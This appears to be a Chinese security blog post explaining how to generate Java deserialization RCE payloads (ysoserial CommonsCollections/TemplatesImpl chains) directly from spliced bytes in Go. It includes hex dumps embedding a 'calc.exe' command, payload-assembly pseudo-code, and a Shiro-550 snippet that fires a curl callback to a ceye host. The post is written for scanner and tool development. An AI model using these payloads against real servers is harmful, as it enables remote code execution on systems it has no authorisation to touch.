> 原文链接: https://www.anquanke.com//post/id/252024 


# 二进制角度构造Java反序列化Payload


                                阅读量   
                                **30968**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t01a6bab72d750f8b38.gif)](https://p2.ssl.qhimg.com/t01a6bab72d750f8b38.gif)



## 介绍

最近用Go编写Java反序列化相关的扫描器，遇到一个难点：如何拿到根据命令生成的payload

通过阅读已有开源工具的源码，发现大致有以下两种解决方案

### <a class="reference-link" name="%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%B3%95"></a>执行命令法

使用命令执行ysoserial.jar，例如一些python工具用system，popen等函数，拼接命令拿到输出

[![](https://p3.ssl.qhimg.com/t0153b62f5d55905495.png)](https://p3.ssl.qhimg.com/t0153b62f5d55905495.png)
- 优点：最简单的实现，快速上手
- 缺点：ysoserial.jar过大，并且依赖java环境，并不是很方便
### <a class="reference-link" name="%E7%9B%B4%E6%8E%A5%E7%94%A8Java%E7%BC%96%E5%86%99"></a>直接用Java编写

很多工具直接采用Java编写，生成payload的部分可以脱离ysoserial.jar，结合反射和Javaassist技术做进一步的处理

[![](https://p2.ssl.qhimg.com/t018ef3aacc1d41963c.png)](https://p2.ssl.qhimg.com/t018ef3aacc1d41963c.png)
- 优点：用Java来生成Java的payload是最标准的
- 缺点：必须由Java编写的工具才可以
### <a class="reference-link" name="%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%A7%92%E5%BA%A6%E6%9E%84%E9%80%A0"></a>二进制角度构造

反序列化数据本身是有结构的，比如多次生成CC1的payload可以看到只有命令和命令前两字节有变化。前面两字节表示了命令的长度，所以我们直接拼接一下即可实现CC1

（图中0008表示命令长度，calc.exe是命令）

[![](https://p2.ssl.qhimg.com/t01be69bb61d6c04e78.png)](https://p2.ssl.qhimg.com/t01be69bb61d6c04e78.png)

其实更多的Payload并不是像CC1这么简单，比如构造`TemplateImpl`，过程较复杂



## 预备

笔者在ysoserial的`PayloadRunner`里写代码导出，并且打印一下HEX，方便比较

```
private static final char[] hexCode = "0123456789ABCDEF".toCharArray();
public static String printHexBinary(byte[] data) `{`
  StringBuilder r = new StringBuilder(data.length * 2);
  for (byte b : data) `{`
    r.append(hexCode[(b &gt;&gt; 4) &amp; 0xF]);
    r.append(hexCode[(b &amp; 0xF)]);
  `}`
  return r.toString();
`}`

public static void run(final Class&lt;? extends ObjectPayload&lt;?&gt;&gt; clazz, final String[] args) throws Exception `{`
  ......
  FileOutputStream fos = new FileOutputStream("cc2.bin");
  fos.write(ser);
  System.out.println(printHexBinary(ser));
  ......
```



## 分析过程

分析生成的cc2.bin需要用xxd命令：`xxd cc2.bin`

第一处关键点：

`0000 069c`表示后面`cafe babe`开头的class文件长度，以此可以确定payload固定的开头部分。开头部分命名为`globalPrefix`，四字节的长度变量命名为`dataLen`

（如何确认到这里：肉眼审计，排除看上去是常量或系统函数的地方）

```
00000340: 6767 db37 0200 0078 7000 0000 0275 7200  gg.7...xp....ur.
00000350: 025b 42ac f317 f806 0854 e002 0000 7870  .[B......T....xp
00000360: 0000 069c cafe babe 0000 0032 0039 0a00  ...........2.9..
00000370: 0300 2207 0037 0700 2507 0026 0100 1073  .."..7..%..&amp;...s
```

以此为根据找到class文件结束位置`0x0364+0x069c=0x0a00`，从`0x364-0x0a00`这一部分都是构造`templatesImpl`的二进制，观察到`7571007e`以后的部分都是常量，以此确认结尾部分是`7571007e`往后至结尾，命名为`globalSuffix`

```
000009f0: 0011 0000 000a 0001 0002 0023 0010 0009  ...........#....
00000a00: 7571 007e 0018 0000 01d4 cafe babe 0000  uq.~............
00000a10: 0032 001b 0a00 0300 1507 0017 0700 1807  .2..............
00000a20: 0019 0100 1073 6572 6961 6c56 6572 7369  .....serialVersi
```

继续从一开始的`cafe babe`审计至`00000800: 000863616c632e657865`，`0008`表示长度为8的命令`calc.exe`，以此确认从`cafe babe`开始的class文件的开头部分，命名为`prefix`

```
000007e0: 7469 6d65 0100 1528 294c 6a61 7661 2f6c  time...()Ljava/l
000007f0: 616e 672f 5275 6e74 696d 653b 0c00 2c00  ang/Runtime;..,.
00000800: 2d0a 002b 002e 0100 0863 616c 632e 6578  -..+.....calc.ex
00000810: 6508 0030 0100 0465 7865 6301 0027 284c  e..0...exec..'(L
```

因此从`0x0364-0x0806`为常量：`cafebabe...2b002e01`

随后插入2字节的命令长度和命令本身，可以动态构造，分别命名为`cmdLen`和`cmd`

审计至`0x0870`，发现`0x0871-0x087e`和`0x892-0x089f`是两个相同的数字，长度14。经过多个操作系统的比较，发现这个数字可以是14，15，16。这个数字来源是系统时间，作用只是一个随机ID。所以我们可以生成随机的数字，随机数命名为`randNum`

在命令和随机数之间还有一部分多余的数据，我们将它命名为`beforeRand`

中间拼接的部分是`0x087f-0x0891`，也就是`01001f4c79736f73657269616c2f50776e6572`，分割符命名为`split`（其实ysoserial/Pwner这个字符串也是可以随机的，但没必要再做）

```
00000850: 000d 5374 6163 6b4d 6170 5461 626c 6501  ..StackMapTable.
00000860: 001d 7973 6f73 6572 6961 6c2f 5077 6e65  ..ysoserial/Pwne
00000870: 7237 3833 3834 3833 3035 3434 3731 3601  r78384830544716.
00000880: 001f 4c79 736f 7365 7269 616c 2f50 776e  ..Lysoserial/Pwn
00000890: 6572 3738 3338 3438 3330 3534 3437 3136  er78384830544716
000008a0: 3b00 2100 0200 0300 0100 0400 0100 1a00  ;.!.............
000008b0: 0500 0600 0100 0700 0000 0200 0800 0400  ................
```

最后确认class文件的结尾部分，从`0x08a0-0x09ff`，固定格式`3b002100...00100009`，命名为`suffix`，至此可以成功构造出`templatesImpl`

```
3B002100020003000100040001001A000500060001000700000002000800040001000A000B000100
0C0000002F00010001000000052AB70001B100000002000D0000000600010000002F000E0000000C
000100000005000F003800000001001300140002000C0000003F0000000300000001B10000000200
0D00000006000100000034000E00000020000300000001000F003800000000000100150016000100
0000010017001800020019000000040001001A00010013001B0002000C0000004900000004000000
01B100000002000D00000006000100000038000E0000002A000400000001000F0038000000000001
00150016000100000001001C001D000200000001001E001F00030019000000040001001A00080029
000B0001000C00000024000300020000000FA70003014CB8002F1231B6003557B100000001003600
0000030001030002002000000002002100110000000A00010002002300100009
```



## 实现

通过上文中的命名，可以得出一个简化后的实现函数

```
func GetCommonsCollections2(cmd string) []byte `{`
  ......
  // dataLen取决于TemplateImpl的大小
  // 在TemplateImpl中构造命令
  // 其他都是常量
  templateImpl := GetTemplateImpl(cmd)
  dataLen := calcTemplateImpl(templateImpl)
  ......
  return globalPrefix + dataLen + templateImpl + globalSuffix
`}`
func GetTemplateImpl(cmd string) []byte `{`
  ......
  // cmd由用户输入
  // cmdLen可以计算得出
  // randNum可以随机出
  // 其他都是常量
  cmdLen := caclCmdLen(cmd)
  randNum := getRandNum(cmd)
  ......
  return prefix + cmdLen + cmd + beforeRand + randNum + split + randNum + suffix
`}`
```



## 测试

按照思路生成好之后，测试时先用ysoserial生成数据，xxd命令阅读得到随机数，把变量randNum替换

然后生成Payload进行判断，笔者调试过程遇到不少的坑，比如randNum忘记做`hex.encode`了

而其中`cmdLen`和`dataLen`变量其实是无法一眼看出的，笔者能够确认是因为跑了多次ysoserial，对比分析得出的结果



## 实践

笔者在github提交了比较完整的一个库：[https://github.com/EmYiQing/Gososerial](https://github.com/EmYiQing/Gososerial)

该库支持了CC1-CC7,CCK1-CCK4,CB1这些链，并且经过了验证没有问题，可以做到ysoserial的效果

初步确定生成的payload没问题，进一步确认需要靶机

这里用了vulhub的shiro550反序列化靶机，用curl命令结合ceye平台，成功触发

（下图为笔者用golang编写的shiro检测小工具，调用了gososerial的函数，成功执行）

```
randStr = tool.GetRandomLetter(20)
payload = gososerial.GetCC5("curl " + ceyeInfo.Identifier + "/" + randStr)
log.Info("check %s", gadget.CC5)
SendPayload(key, payload, target)
if checkCeyeResp(ceyeInfo, randStr) `{`
    log.Info("payload %s success", gadget.CC5)
`}`
```

[![](https://p3.ssl.qhimg.com/t01eea03c60c71731f2.png)](https://p3.ssl.qhimg.com/t01eea03c60c71731f2.png)



## 总结

整个过程不难，但需要耐心和眼力

其他的反序列化链换汤不换药，甚至`TomcatEcho`也是类似的原理

因此安全开发者可以在不使用ysoserial的情况下，直接动态生成payload

另外文中这种半猜半测试的实现方式不妥，有兴趣的大佬可以参考java底层反序列化的实现，对二进制数据做进一步的分析和构造

（p师傅好像正在做这件事）
